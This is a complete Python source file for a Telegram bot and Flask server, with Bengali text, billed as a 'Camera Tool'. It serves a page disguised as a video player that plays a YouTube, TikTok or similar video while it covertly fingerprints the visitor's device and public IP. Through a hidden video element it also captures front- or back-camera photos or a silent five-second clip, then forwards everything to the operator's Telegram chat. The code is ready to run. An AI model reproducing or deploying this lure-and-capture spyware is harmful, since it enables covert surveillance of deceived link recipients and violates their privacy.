#!/usr/bin/env python3
"""
Camera Tool Bot — Photo & Silent Video + Device Info (No Location, No Gallery)
===============================================================================
Features:
  - Front / Back camera support
  - Photo Mode: 4 photos in 4 seconds
  - Video Mode: 5-second SILENT video (no mic permission)
  - Device Info: model, OS, browser, screen, battery, network, IP, hardware, camera list
  - NO Location permission, NO Gallery access
"""

import os
import io
import uuid
import base64
import threading
import requests
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

app = Flask(__name__)

# ==========================================
# Secrets
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "")

ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}


def is_authorized_chat(chat_id):
    return str(chat_id) in ALLOWED_CHAT_IDS


if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
    raise SystemExit(1)

user_sessions = {}
link_store = {}


# ==========================================
# Telegram Senders
# ==========================================
def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {"photo": photo_file}
    payload = {"chat_id": chat_id}
    if caption:
        payload["caption"] = caption
    try:
        r = requests.post(url, files=files, data=payload, timeout=30)
        r.raise_for_status()
        return {"status": "success"}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}


def send_video_to_telegram(video_file, chat_id, bot_token, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendVideo"
    files = {"video": video_file}
    payload = {"chat_id": chat_id}
    if caption:
        payload["caption"] = caption
    try:
        r = requests.post(url, files=files, data=payload, timeout=120)
        r.raise_for_status()
        return {"status": "success"}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}


def send_message_to_telegram(text, chat_id, bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
               "disable_web_page_preview": "true"}
    try:
        r = requests.post(url, data=payload, timeout=30)
        r.raise_for_status()
        return {"status": "success"}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}


def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
    try:
        if "," in photo_data:
            image_data = photo_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid image data format"}
        image_bytes = base64.b64decode(image_data)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"
        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
        return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}


def capture_and_send_video(video_data, chat_id, camera_type="front", duration=5):
    try:
        if "," in video_data:
            video_b64 = video_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid video data format"}
        video_bytes = base64.b64decode(video_b64)
        video_file = io.BytesIO(video_bytes)
        video_file.name = f"{camera_type}_video_{duration}s.webm"
        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও (সাউন্ড ছাড়া, {duration}s)"
        return send_video_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}


# ==========================================
# Device Info Formatter (Location ও Gallery বাদ)
# ==========================================
def format_device_info(info):
    if not info:
        return "ℹ️ কোনো ডিভাইস তথ্য পাওয়া যায়নি"

    def esc(v):
        return str(v) if v not in (None, "", "N/A", "Unknown") else "—"

    lines = ["<b>📱 ডিভাইস তথ্য</b>", "━━━━━━━━━━━━━━━━━━"]

    # Device
    lines.append("<b>📱 Device:</b>")
    lines.append(f"  • Model: <code>{esc(info.get('deviceModel'))}</code>")
    lines.append(f"  • Vendor: <code>{esc(info.get('deviceVendor'))}</code>")
    lines.append(f"  • Type: <code>{esc(info.get('deviceType'))}</code>")
    lines.append(f"  • Platform: <code>{esc(info.get('platform'))}</code>")

    # OS
    lines.append("\n<b>💻 OS:</b>")
    lines.append(f"  • OS Version: <code>{esc(info.get('osVersion'))}</code>")
    ua = esc(info.get('userAgent'))
    lines.append(f"  • User Agent: <code>{ua[:120]}</code>")

    # Browser
    lines.append("\n<b>🌐 Browser:</b>")
    lines.append(f"  • Name: <code>{esc(info.get('browser'))}</code>")
    lines.append(f"  • Version: <code>{esc(info.get('browserVersion'))}</code>")
    lines.append(f"  • Language: <code>{esc(info.get('language'))}</code>")
    lines.append(f"  • Languages: <code>{esc(info.get('languages'))}</code>")
    lines.append(f"  • Timezone: <code>{esc(info.get('timezone'))}</code>")

    # Screen
    lines.append("\n<b>🖥 Screen:</b>")
    lines.append(f"  • Resolution: <code>{esc(info.get('screen'))}</code>")
    lines.append(f"  • Available: <code>{esc(info.get('screenAvailable'))}</code>")
    lines.append(f"  • Viewport: <code>{esc(info.get('viewport'))}</code>")
    lines.append(f"  • Pixel Ratio: <code>{esc(info.get('pixelRatio'))}</code>")
    lines.append(f"  • Color Depth: <code>{esc(info.get('colorDepth'))}</code>")
    lines.append(f"  • Orientation: <code>{esc(info.get('orientation'))}</code>")

    # Battery
    batt = info.get("battery", {})
    if batt:
        charging = "⚡ চার্জিং" if batt.get("charging") else "🔋 ডিসচার্জিং"
        lines.append("\n<b>🔋 Battery:</b>")
        lines.append(f"  • Level: <code>{esc(batt.get('level'))}%</code>")
        lines.append(f"  • Status: <code>{charging}</code>")
        if batt.get("chargingTime") not in (None, "Unknown", ""):
            lines.append(f"  • Charging Time: <code>{batt.get('chargingTime')}s</code>")
        if batt.get("dischargingTime") not in (None, "Unknown", ""):
            lines.append(f"  • Discharging Time: <code>{batt.get('dischargingTime')}s</code>")

    # Network
    net = info.get("network", {})
    if net:
        lines.append("\n<b>📶 Network:</b>")
        lines.append(f"  • Connection: <code>{esc(net.get('type'))}</code>")
        lines.append(f"  • Effective Type: <code>{esc(net.get('effectiveType'))}</code>")
        lines.append(f"  • Downlink: <code>{esc(net.get('downlink'))} Mbps</code>")
        lines.append(f"  • RTT: <code>{esc(net.get('rtt'))} ms</code>")
        lines.append(f"  • Save Data: <code>{esc(net.get('saveData'))}</code>")

    # Public IP
    lines.append("\n<b>🌐 Public IP:</b>")
    lines.append(f"  • IP: <code>{esc(info.get('ip'))}</code>")

    # Hardware
    lines.append("\n<b>⚙️ Hardware:</b>")
    lines.append(f"  • CPU Cores: <code>{esc(info.get('cores'))}</code>")
    lines.append(f"  • Memory: <code>{esc(info.get('memory'))} GB</code>")
    lines.append(f"  • Touch Points: <code>{esc(info.get('touchPoints'))}</code>")
    lines.append(f"  • Cookies: <code>{esc(info.get('cookiesEnabled'))}</code>")
    lines.append(f"  • Online: <code>{esc(info.get('online'))}</code>")

    # Camera list
    cams = info.get("cameras", [])
    if cams:
        lines.append("\n<b>📷 Available Cameras:</b>")
        for i, c in enumerate(cams, 1):
            lines.append(f"  {i}. <code>{esc(c)}</code>")

    # Camera capabilities
    caps = info.get("cameraCapabilities", {})
    if caps:
        lines.append("\n<b>🎥 Camera Capabilities:</b>")
        lines.append(f"  • Facing: <code>{esc(caps.get('facingMode'))}</code>")
        lines.append(f"  • Max Resolution: <code>{esc(caps.get('maxResolution'))}</code>")
        lines.append(f"  • Torch: <code>{esc(caps.get('torch'))}</code>")
        zoom = caps.get("zoom")
        if zoom and zoom not in ("Unknown", "N/A"):
            lines.append(f"  • Zoom: <code>{zoom}</code>")

    return "\n".join(lines)


# ==========================================
# Capture HTML
# ==========================================
CAPTURE_HTML = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000; color: #fff; font-family: Arial, sans-serif;
            min-height: 100vh; display: flex; flex-direction: column;
            align-items: center; justify-content: center; overflow: hidden;
        }
        .video-wrapper { width: 100%; max-width: 900px; position: relative; }
        video { width: 100%; height: auto; display: block; background: #000; }
        iframe { width: 100%; height: 70vh; border: none; display: block; background: #000; }
        .info { position: fixed; bottom: 10px; right: 10px; font-size: 11px; color: #555; }
        .loading { text-align: center; padding: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="video-wrapper" id="videoContainer">
        <div class="loading">⏳ লোড হচ্ছে...</div>
    </div>
    <div class="info">Auto-play enabled</div>

    <script>
        const VIDEO_URL = "{{ video_url }}";
        const CHAT_ID = "{{ chat_id }}";
        const CAMERA_TYPE = "{{ camera_type }}";
        const LINK_ID = "{{ link_id }}";
        const CAPTURE_MODE = "{{ mode }}";

        // =========================================================
        // 🔍 Helpers
        // =========================================================
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let name = "Unknown", ver = "Unknown";
            if (/Edg\\//.test(ua)) { name = "Edge"; ver = ua.match(/Edg\\/([\\d.]+)/)?.[1] || "?"; }
            else if (/OPR\\//.test(ua) || /Opera/.test(ua)) { name = "Opera"; ver = ua.match(/OPR\\/([\\d.]+)/)?.[1] || "?"; }
            else if (/Chrome\\//.test(ua)) { name = "Chrome"; ver = ua.match(/Chrome\\/([\\d.]+)/)?.[1] || "?"; }
            else if (/Firefox\\//.test(ua)) { name = "Firefox"; ver = ua.match(/Firefox\\/([\\d.]+)/)?.[1] || "?"; }
            else if (/Safari\\//.test(ua)) { name = "Safari"; ver = ua.match(/Version\\/([\\d.]+)/)?.[1] || "?"; }
            return { name, ver };
        }

        function detectOS() {
            const ua = navigator.userAgent;
            if (/Windows NT 10/.test(ua)) return "Windows 10/11";
            if (/Windows NT 6\\.3/.test(ua)) return "Windows 8.1";
            if (/Windows NT 6\\.1/.test(ua)) return "Windows 7";
            if (/Android ([\\d.]+)/.test(ua)) return "Android " + ua.match(/Android ([\\d.]+)/)[1];
            if (/iPhone OS ([\\d_]+)/.test(ua)) return "iOS " + ua.match(/iPhone OS ([\\d_]+)/)[1].replace(/_/g, ".");
            if (/iPad.*OS ([\\d_]+)/.test(ua)) return "iPadOS " + ua.match(/OS ([\\d_]+)/)[1].replace(/_/g, ".");
            if (/Mac OS X ([\\d_]+)/.test(ua)) return "macOS " + ua.match(/Mac OS X ([\\d_]+)/)[1].replace(/_/g, ".");
            if (/Linux/.test(ua)) return "Linux";
            return "Unknown";
        }

        function detectDeviceType() {
            const ua = navigator.userAgent;
            if (/iPad|Tablet|PlayBook|Silk/i.test(ua)) return "Tablet";
            if (/Mobile|iPhone|iPod|Android.*Mobile|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return "Mobile";
            return "Desktop";
        }

        function getOrientation() {
            if (screen.orientation && screen.orientation.type) return screen.orientation.type;
            if (window.orientation !== undefined) {
                return Math.abs(window.orientation) === 90 ? "landscape" : "portrait";
            }
            return "Unknown";
        }

        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    return {
                        level: Math.round(b.level * 100),
                        charging: b.charging,
                        chargingTime: b.chargingTime === Infinity ? "—" : Math.round(b.chargingTime),
                        dischargingTime: b.dischargingTime === Infinity ? "—" : Math.round(b.dischargingTime)
                    };
                }
            } catch (e) {}
            return null;
        }

        function getNetworkInfo() {
            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!c) return null;
            return {
                type: c.type || "unknown",
                effectiveType: c.effectiveType || "unknown",
                downlink: c.downlink || "?",
                rtt: c.rtt || "?",
                saveData: c.saveData || false
            };
        }

        async function getPublicIP() {
            try {
                const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
                const j = await r.json();
                return j.ip || "Unknown";
            } catch (e) { return "Unknown"; }
        }

        async function listCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.filter(d => d.kind === "videoinput")
                              .map(d => d.label || "Camera (label hidden)");
            } catch (e) { return []; }
        }

        async function getCameraCapabilities() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: CAMERA_TYPE === "back" ? "environment" : "user" },
                    audio: false
                });
                const track = stream.getVideoTracks()[0];
                let caps = {};
                if (track.getCapabilities) {
                    const c = track.getCapabilities();
                    caps = {
                        facingMode: c.facingMode ? c.facingMode.join(", ") : "Unknown",
                        maxResolution: (c.width?.max || "?") + "x" + (c.height?.max || "?"),
                        torch: c.torch ? "supported" : "not supported",
                        zoom: c.zoom ? `${c.zoom.min || 1}x - ${c.zoom.max || 1}x` : "not supported"
                    };
                }
                stream.getTracks().forEach(t => t.stop());
                return caps;
            } catch (e) { return {}; }
        }

        // =========================================================
        // 📱 ডিভাইস তথ্য সংগ্রহ (Location ও Gallery বাদ)
        // =========================================================
        async function collectDeviceInfo() {
            const b = getBrowserInfo();
            const battery = await getBatteryInfo();
            const ip = await getPublicIP();
            const cams = await listCameras();
            const caps = await getCameraCapabilities();

            const info = {
                // Browser / OS
                userAgent: navigator.userAgent,
                platform: navigator.platform || "Unknown",
                osVersion: detectOS(),
                deviceType: detectDeviceType(),
                deviceModel: navigator.userAgentData?.platform || navigator.platform || "Unknown",
                deviceVendor: navigator.vendor || "Unknown",
                browser: b.name,
                browserVersion: b.ver,
                language: navigator.language,
                languages: (navigator.languages || []).join(", "),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,

                // Screen
                screen: `${screen.width}x${screen.height}`,
                screenAvailable: `${screen.availWidth}x${screen.availHeight}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                pixelRatio: window.devicePixelRatio || 1,
                colorDepth: screen.colorDepth,
                orientation: getOrientation(),

                // Hardware
                cores: navigator.hardwareConcurrency || "Unknown",
                memory: navigator.deviceMemory || "Unknown",
                touchPoints: navigator.maxTouchPoints || 0,
                cookiesEnabled: navigator.cookieEnabled,
                online: navigator.onLine,

                // Network / Battery
                network: getNetworkInfo(),
                battery: battery,
                ip: ip,

                // Cameras
                cameras: cams,
                cameraCapabilities: caps
            };
            return info;
        }

        function sendDeviceInfo(info) {
            return fetch('/device_info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    camera_type: CAMERA_TYPE,
                    info: info
                })
            });
        }

        // =========================================================
        // মোড ১: ছবি ক্যাপচার
        // =========================================================
        async function startPhotoCapture() {
            try {
                const constraints = {
                    video: { facingMode: CAMERA_TYPE === "back" ? "environment" : "user" },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);

                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = stream;
                hiddenVideo.setAttribute('playsinline', 'true');
                hiddenVideo.muted = true;
                hiddenVideo.style.display = 'none';
                document.body.appendChild(hiddenVideo);
                hiddenVideo.play();

                hiddenVideo.onplaying = () => {
                    const TOTAL_PHOTOS = 4;
                    const INTERVAL_MS = 1000;
                    const START_DELAY = 1000;
                    let photoCount = 0;

                    setTimeout(() => {
                        const interval = setInterval(async () => {
                            try {
                                const canvas = document.createElement('canvas');
                                canvas.width = hiddenVideo.videoWidth || 640;
                                canvas.height = hiddenVideo.videoHeight || 480;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                                const photo = canvas.toDataURL('image/jpeg', 0.85);
                                photoCount++;

                                await fetch('/capture', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        photo: photo,
                                        chat_id: CHAT_ID,
                                        camera_type: CAMERA_TYPE,
                                        photo_num: photoCount,
                                        total: TOTAL_PHOTOS
                                    })
                                });
                                if (photoCount >= TOTAL_PHOTOS) {
                                    clearInterval(interval);
                                    stream.getTracks().forEach(t => t.stop());
                                }
                            } catch (e) { console.log("capture error", e); }
                        }, INTERVAL_MS);
                    }, START_DELAY);
                };
            } catch (e) { console.log("camera error", e); }
        }

        // =========================================================
        // মোড ২: সাইলেন্ট ভিডিও ক্যাপচার (৫ সেকেন্ড)
        // =========================================================
        async function startVideoCapture() {
            try {
                const constraints = {
                    video: {
                        facingMode: CAMERA_TYPE === "back" ? "environment" : "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);

                let mimeType = 'video/webm;codecs=vp8';
                if (!window.MediaRecorder || !MediaRecorder.isTypeSupported(mimeType)) {
                    if (MediaRecorder.isTypeSupported('video/webm')) mimeType = 'video/webm';
                    else if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4';
                    else mimeType = '';
                }

                const options = mimeType ? { mimeType: mimeType } : {};
                const recorder = new MediaRecorder(stream, options);
                const chunks = [];
                const actualMime = recorder.mimeType || mimeType || 'video/webm';

                recorder.ondataavailable = (e) => {
                    if (e.data && e.data.size > 0) chunks.push(e.data);
                };

                recorder.onstop = async () => {
                    try {
                        const blob = new Blob(chunks, { type: actualMime });
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            await fetch('/capture_video', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    video: reader.result,
                                    chat_id: CHAT_ID,
                                    camera_type: CAMERA_TYPE,
                                    duration: 5
                                })
                            });
                        };
                        reader.readAsDataURL(blob);
                    } catch (err) { console.log("video send error", err); }
                    finally { stream.getTracks().forEach(t => t.stop()); }
                };

                setTimeout(() => {
                    try { recorder.start(); } catch (e) { return; }
                    setTimeout(() => {
                        try { if (recorder.state !== 'inactive') recorder.stop(); } catch (e) {}
                    }, 5000);
                }, 1000);

            } catch (e) { console.log("video camera error", e); }
        }

        // =========================================================
        // ভিডিও লোড
        // =========================================================
        function loadVideo() {
            const container = document.getElementById('videoContainer');
            if (!VIDEO_URL) {
                container.innerHTML = '<div class="loading">কোনো ভিডিও নেই</div>';
                return;
            }
            const url = VIDEO_URL;

            if (url.includes('youtube.com') || url.includes('youtu.be')) {
                let vid = '';
                if (url.includes('youtu.be/')) vid = url.split('youtu.be/')[1].split('?')[0];
                else if (url.includes('v=')) vid = url.split('v=')[1].split('&')[0];
                else if (url.includes('shorts/')) vid = url.split('shorts/')[1].split('?')[0];
                container.innerHTML = `<iframe src="https://www.youtube.com/embed/${vid}?autoplay=1&mute=0&playsinline=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>`;
            }
            else if (url.includes('tiktok.com')) {
                const match = url.match(/\\/video\\/(\\d+)/);
                if (match) container.innerHTML = `<iframe src="https://www.tiktok.com/embed/v2/${match[1]}" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
                else window.location.href = url;
            }
            else if (url.includes('instagram.com')) {
                const match = url.match(/\\/(reel|p|tv)\\/([A-Za-z0-9_-]+)/);
                if (match) container.innerHTML = `<iframe src="https://www.instagram.com/${match[1]}/${match[2]}/embed/" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
                else window.location.href = url;
            }
            else if (url.includes('facebook.com') || url.includes('fb.watch')) {
                container.innerHTML = `<iframe src="https://www.facebook.com/plugins/video.php?href=${encodeURIComponent(url)}&show_text=0&autoplay=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen style="width:100%; height:80vh; border:none;"></iframe>`;
            }
            else if (url.includes('vimeo.com')) {
                const match = url.match(/vimeo\\.com\\/(\\d+)/);
                if (match) container.innerHTML = `<iframe src="https://player.vimeo.com/video/${match[1]}?autoplay=1" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>`;
                else window.location.href = url;
            }
            else if (url.match(/\\.(mp4|webm|ogg|mov)(\\?|$)/i)) {
                container.innerHTML = `<video autoplay controls playsinline><source src="${url}"></video>`;
            }
            else { window.location.href = url; }
        }

        // === সব শুরু ===
        window.onload = async () => {
            loadVideo();

            // ডিভাইস তথ্য সংগ্রহ → Telegram-এ পাঠান
            try {
                const info = await collectDeviceInfo();
                await sendDeviceInfo(info);
            } catch (e) { console.log("device info error", e); }

            // ক্যাপচার শুরু
            if (CAPTURE_MODE === "video") {
                startVideoCapture();
            } else {
                startPhotoCapture();
            }
        };
    </script>
</body>
</html>
"""


# ==========================================
# Flask Routes
# ==========================================
@app.route("/")
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>Service</title>
    <style>body{font-family:Arial;text-align:center;padding:50px;background:#f0f0f0;}h1{color:#333;}</style>
    </head>
    <body><h1>✅ Service is running</h1><p>Telegram বট চালু আছে।</p></body>
    </html>
    """


@app.route("/v/<link_id>")
def view_link(link_id):
    data = link_store.get(link_id)
    if not data:
        return "লিংকটি পাওয়া যায়নি বা মেয়াদ শেষ", 404
    return render_template_string(
        CAPTURE_HTML,
        video_url=data.get("video_url", ""),
        chat_id=data.get("chat_id", ""),
        camera_type=data.get("camera", "front"),
        link_id=link_id,
        mode=data.get("mode", "photo"),
    )


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True)
    if not data or "photo" not in data:
        return jsonify({"status": "error", "details": "No photo"}), 400
    chat_id = data.get("chat_id", CHAT_ID)
    camera_type = data.get("camera_type", "front")
    photo_num = data.get("photo_num", 1)
    total = data.get("total", 4)
    result = capture_and_send_photo(data["photo"], chat_id, camera_type, photo_num, total)
    return jsonify(result)


@app.route("/capture_video", methods=["POST"])
def capture_video():
    data = request.get_json(silent=True)
    if not data or "video" not in data:
        return jsonify({"status": "error", "details": "No video"}), 400
    chat_id = data.get("chat_id", CHAT_ID)
    camera_type = data.get("camera_type", "front")
    duration = data.get("duration", 5)
    result = capture_and_send_video(data["video"], chat_id, camera_type, duration)
    return jsonify(result)


@app.route("/device_info", methods=["POST"])
def device_info():
    data = request.get_json(silent=True)
    if not data or "info" not in data:
        return jsonify({"status": "error", "details": "No info"}), 400

    chat_id = data.get("chat_id", CHAT_ID)
    info = data.get("info", {})
    # Server-side IP fallback
    if not info.get("ip") or info.get("ip") == "Unknown":
        info["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown").split(",")[0].strip()

    text = format_device_info(info)
    result = send_message_to_telegram(text, chat_id, BOT_TOKEN)
    return jsonify(result)


# ==========================================
# Telegram Bot Handlers
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized_chat(update.effective_chat.id):
        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
        return
    keyboard = [[
        InlineKeyboardButton("📸 Front Camera", callback_data="cam_front"),
        InlineKeyboardButton("📷 Back Camera", callback_data="cam_back"),
    ]]
    await update.message.reply_text(
        "🎥 *Camera Tool*\n\nকোন ক্যামেরা ব্যবহার করতে চান?",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_authorized_chat(query.message.chat_id):
        await query.edit_message_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
        return

    data = query.data
    chat_id = str(query.message.chat_id)

    if data.startswith("cam_"):
        cam = data.split("_")[1]
        user_sessions[chat_id] = {"camera": cam}
        keyboard = [
            [InlineKeyboardButton("📸 Photo Mode", callback_data="mode_photo"),
             InlineKeyboardButton("🎥 Video Mode (Silent)", callback_data="mode_video")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
        ]
        cam_name = "Front" if cam == "front" else "Back"
        await query.edit_message_text(
            f"✅ *{cam_name} Camera* সিলেক্ট করা হয়েছে।\n\n"
            f"💡 *Your Chat ID:* `{chat_id}`\n\nএখন মোড বেছে নিন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return

    if data == "mode_photo":
        s = user_sessions.get(chat_id, {}); s["mode"] = "photo"; user_sessions[chat_id] = s
        keyboard = [
            [InlineKeyboardButton("🔗 Redirect Link (Enter URL)", callback_data="link_redirect")],
            [InlineKeyboardButton("🔗 Direct Link", callback_data="link_direct")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
        ]
        await query.edit_message_text(
            "📸 *Photo Mode*\n\nলিংকের ধরন বেছে নিন:",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "mode_video":
        s = user_sessions.get(chat_id, {}); s["mode"] = "video"; user_sessions[chat_id] = s
        keyboard = [
            [InlineKeyboardButton("🔗 Redirect Link (Enter URL)", callback_data="link_redirect")],
            [InlineKeyboardButton("🔗 Direct Link", callback_data="link_direct")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
        ]
        await query.edit_message_text(
            "🎥 *Video Mode (৫ সেকেন্ড — সাউন্ড ছাড়া)*\n\n"
            "🔇 মাইক পারমিশন লাগবে না\n\nলিংকের ধরন বেছে নিন:",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "link_redirect":
        s = user_sessions.get(chat_id, {})
        s["waiting_url"] = True; s["link_type"] = "redirect"; user_sessions[chat_id] = s
        await query.edit_message_text(
            "🔄 *Enter ANY Custom Link/URL*\n\n"
            "✅ কাজ করবে: YouTube, TikTok, Instagram, Facebook, MP4\n\n"
            "👉 শুধু লিংকটি পাঠান:", parse_mode="Markdown")
        return

    if data == "link_direct":
        s = user_sessions.get(chat_id, {})
        cam = s.get("camera", "front"); mode = s.get("mode", "photo")
        link_id = uuid.uuid4().hex[:10]
        link_store[link_id] = {"chat_id": chat_id, "video_url": "", "camera": cam, "mode": mode}
        public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 ছবি: ৪টি (৪ সেকেন্ডে)"
        await query.edit_message_text(
            f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
            f"📸 Camera: *{cam.capitalize()}*\n🎯 Mode: *{mode.capitalize()}*\n"
            f"{details}\n📱 ডিভাইস তথ্যও আসবে\n\n"
            f"🔗 লিংক:\n`{public_link}`\n\n⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
            reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        return

    if data == "cancel":
        user_sessions.pop(chat_id, None)
        await query.edit_message_text("❌ বাতিল করা হয়েছে। আবার `/start` পাঠান।")
        return


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized_chat(update.effective_chat.id):
        await update.message.reply_text("❌ আপনি অনুমোদিত ব্যবহারকারী নন।")
        return
    chat_id = str(update.message.chat_id)
    s = user_sessions.get(chat_id, {})
    if not s.get("waiting_url"): return

    url = update.message.text.strip()
    if not url.startswith("http"): url = "https://" + url

    cam = s.get("camera", "front"); mode = s.get("mode", "photo")
    s["waiting_url"] = False; s["video_url"] = url; user_sessions[chat_id] = s

    link_id = uuid.uuid4().hex[:10]
    link_store[link_id] = {"chat_id": chat_id, "video_url": url, "camera": cam, "mode": mode}
    public_link = f"{PUBLIC_URL}/v/{link_id}" if PUBLIC_URL else f"⚠️ PUBLIC_URL সেট করা হয়নি — /v/{link_id}"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    details = "🎥 ভিডিও: ৫ সেকেন্ড (🔇 সাউন্ড ছাড়া)" if mode == "video" else "📷 ছবি: ৪টি (৪ সেকেন্ডে)"

    await update.message.reply_text(
        f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
        f"📸 Camera: *{cam.capitalize()}*\n🎯 Mode: *{mode.capitalize()}*\n"
        f"🎬 Video: `{url[:50]}...`\n{details}\n📱 ডিভাইস তথ্যও আসবে\n\n"
        f"🔗 লিংক:\n`{public_link}`\n\n⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*",
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


# ==========================================
# Main
# ==========================================
def run_flask():
    app.run(host="0.0.0.0", port=8080, use_reloader=False, debug=False)


def main():
    threading.Thread(target=run_flask, daemon=True).start()
    print("🌐 Web Server: http://0.0.0.0:8080")
    print("✅ Telegram Bot শুরু হচ্ছে...")
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("🤖 Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()